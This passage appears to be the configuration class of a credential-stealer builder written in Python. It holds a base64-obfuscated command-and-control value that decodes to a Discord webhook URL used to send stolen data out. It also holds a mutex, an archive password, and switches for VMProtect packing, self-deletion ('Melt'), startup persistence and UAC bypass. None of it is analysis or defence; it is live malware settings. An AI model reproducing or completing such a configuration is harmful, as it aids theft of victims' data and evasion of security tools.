...
class Settings:
    C2 = (0, base64.b64decode('aHR0cHM6Ly9kaXNjb3JkYXBwLmNvbS9hcGkvd2ViaG9va3MvMTI4NzQxNDI4OTA5OTAwMTk3OC9pdkdhMjFGaGZxWXAyeC0tY2l4dmF6ZFFMcWpkNEZzR0ExUGdfTHVOZnRkY3JSUjVNVERqd2t1YWdpLTNTV0xNZG13OA==').decode())
    Mutex = base64.b64decode('cm40aEV4WFoxV29OMlROcw==').decode()
    PingMe = bool('')
    Vmprotect = bool('true')
    Startup = bool('')
    Melt = bool('true')
    UacBypass = bool('')
    ArchivePassword = base64.b64decode('MTEyOA==').decode()
